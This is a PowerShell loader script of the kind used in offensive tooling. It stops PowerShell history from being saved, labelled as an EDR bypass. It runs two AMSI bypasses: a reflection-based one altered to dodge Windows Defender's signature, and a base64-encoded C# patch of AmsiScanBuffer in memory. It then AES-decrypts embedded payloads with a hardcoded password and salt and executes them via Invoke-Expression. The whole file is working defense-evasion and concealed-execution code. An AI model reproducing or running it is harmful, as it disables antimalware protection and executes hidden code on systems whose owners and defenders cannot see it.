$EncFunc0 = ("df3eVWNaZiNJY/DImYrs/w==", "QADvfngP5NCu2SK3pHwZaDllsPa+rbSPO/NpniZdGJt0/XLFC5+/1ToD3crdPnRGHyCbAwVOMX9gX7oEsik/irRAfd0cH1zzIEY+XxWMZ04JFuk491pZeJGjUs8lqr3v23Wt5Msz/miwlUFxpQqtAzDbt1NYU8wnBAImeyIWPJJdRzF947o+wBlGJOOA+vVaVoeFJMb9YPh5olNMzK0dlfScD1B8k3kccPSHFG5EmYBmImJM7S8c84j3f03N5WxDyNQFuoDzabO2M+bMQ/NyIW+h3e7xxNaD02OTgT0bLesxVTMvARgwxFUi0p480/EW19jBfVGRqkMrKS5SN0qyscchW7CbHHPFLgxybbMoH1Igb33XMotyp85lJXe/HljhhnLXAZyxZ5nncyb/mI4LQybruXlw0l6BAJH13cjdUZ04IHGEEdDqrAUjMfMylRVjIPS1zoc4yCt/f24SE4QFJb9Mden8HlimEiqJmjGLzeLHbMSvuuQ0MTOiiN1YDvwiOzejJ3tjcTwpPb0mnaz/s7xlX0WlkJ1CJbQkFDWTMu4N3+s1wjt4PHPxlY61WEnOYgww12BFAatUIfvW7CdDcdsRA9+MesF9umsVDCJMKfcKRElBNq5OIlexd+3ykbjA8MBw1qmB1VcOyYIc6CSEQZQoZyNqow44r9NnT4jewtTOssOMivc3LSswwPjgQADwcuoIAeEJwf49OnPB03Zlc4oTf49OGVXHUUyxxPsrCND6N9ItxZ4EyUZrpIMDExPrSy2L9S0n6YDqxToPtfM4lJFwH+V8sa+evLn9MtiRQkTFvrjG3PHzkvYQFIEFt4Uz/ujnxt1v21NOKHi+5X/d8shGV0QXkBTEJiGvz0Z6jTbIeA0GhCKSIgYyMQJEJnkfQNS1lcNXa8IdliLgD20E+ibbAT/J/TBndM2vKmjP4JA3Xkn88IpzXFfCz0Cn2pMHMIgtCl7J4baSzmLltE3KK45/edTmgJv8sNx3eNUILzWiln5Jp/VksTVKay3Vjp2ciChuaiNnTNe8mJWqfR7m2mArsMpUV4iZKhZ9IWGPn0FOt5oDStHqmOcFCs4SUMxJcI+uF/NMLQk4Ujjhqeub5CEgdgtq7OMclvnhzSx7t8W64a9BAV+7ziB6sGTdVIpX")
$EncFunc1 = ("3QD5CtvNI3vYjZCePeQXRw==", "6ANHSRHoVS6mg6lG6ZTrXCKNppzk2wmWvt1c1oDKnHDf5BopQJoa9I0UfrR0EpL8")
$EncryptedFunctions = @($EncFunc0,$EncFunc1)
$Password="oMjjDAy2K0"
$Salt="?FU77KfXC!"
#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)

#AMSI Bypass 2
$AMSIBypass2encoded = "dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoADQAKAG4AYQBtAGUAcwBwAGEAYwBlACAAUgBhAG4AZABvAG0ATgBhAG0AZQBzAHAAYQBjAGUADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABSAGEAbgBkAG8AbQBDAGwAYQBzAHMADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgASQBuAHQAUAB0AHIAIABoAE0AbwBkAHUAbABlACwAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIASwBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAARQBuAHQAcgB5AFAAbwBpAG4AdAAgAD0AIAAiAFIAdABsAE0AbwB2AGUATQBlAG0AbwByAHkAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAZgBhAGwAcwBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAATQBvAHYAZQBNAGUAbQBvAHIAeQAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAASQBuAHQAUAB0AHIAIABzAHIAYwAsACAAaQBuAHQAIABzAGkAegBlACkAOwANAAoADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAFIAYQBuAGQAbwBtAEYAdQBuAGMAdABpAG8AbgAoACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAYQByAGcAZQB0AEQATABMACAAPQAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoACIAYQBtAHMAaQAuAGQAbABsACIAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAbwB0AGEAbABsAHkATgBvAHQAVABoAGEAdABCAHUAZgBmAGUAcgBZAG8AdQBSAEwAbwBvAGsAaQBuAGcARgBvAHIAUAB0AHIAIAA9ACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAVABhAHIAZwBlAHQARABMAEwALAAgACIAQQBtAHMAaQAiACAAKwAgACIAUwBjAGEAbgAiACAAKwAgACIAQgB1AGYAZgBlAHIAIgApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUAIAA9ACAAKABVAEkAbgB0AFAAdAByACkANQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAWgBlAHIAbwAgAD0AIAAwADsADQAKACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACwAIABkAHcAUwBpAHoAZQAsACAAMAB4ADQAMAAsACAAbwB1AHQAIABaAGUAcgBvACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIABvAG4AZQAgAD0AIAB7ACAAMAB4ADMAMQAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIAB0AHcAbwAgAD0AIAB7ACAAMAB4AGYAZgAsACAAMAB4ADkAMAAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBuAHQAIABsAGUAbgBnAHQAaAAgAD0AIABvAG4AZQAuAEwAZQBuAGcAdABoACAAKwAgAHQAdwBvAC4ATABlAG4AZwB0AGgAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgB5AHQAZQBbAF0AIABzAHUAbQAgAD0AIABuAGUAdwAgAGIAeQB0AGUAWwBsAGUAbgBnAHQAaABdADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AbgBlAC4AQwBvAHAAeQBUAG8AKABzAHUAbQAsADAAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHcAbwAuAEMAbwBwAHkAVABvACgAcwB1AG0ALABvAG4AZQAuAEwAZQBuAGcAdABoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACAAPQAgAE0AYQByAHMAaABhAGwALgBBAGwAbABvAGMASABHAGwAbwBiAGEAbAAoADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AYQByAHMAaABhAGwALgBDAG8AcAB5ACgAcwB1AG0ALAAgADAALAAgAHUAbgBtAGEAbgBhAGcAZQBkAFAAbwBpAG4AdABlAHIALAAgADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AbwB2AGUATQBlAG0AbwByAHkAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACAAKwAgADAAeAAwADAAMQBiACwAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACwAIAAzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAfQA="
$AMSIBypass2 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($AMSIBypass2encoded))
Add-Type -TypeDefinition $AMSIBypass2
[RandomNamespace.RandomClass]::RandomFunction()
if($Password -and $Salt)
{
$Index = 0
foreach($ef in $EncryptedFunctions)
{

[byte[]]$CipherText = [Convert]::FromBase64String($ef[1])
[byte[]]$InitVector = [Convert]::FromBase64String($ef[0])

$AES = [System.Security.Cryptography.Aes]::Create()

$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)
$AES.IV = $InitVector

$AESDecryptor = $AES.CreateDecryptor()

$MemoryStream = New-Object System.IO.MemoryStream($CipherText,$True)
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
$StreamReader = New-Object System.IO.StreamReader($CryptoStream)

$Message = $StreamReader.ReadToEnd()

$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

try {$Message | Invoke-Expression } catch { Write-Warning "Error loading function number $Index. Beware that this only affects the mentioned function so everything else should work fine." }

$Index++
}
}
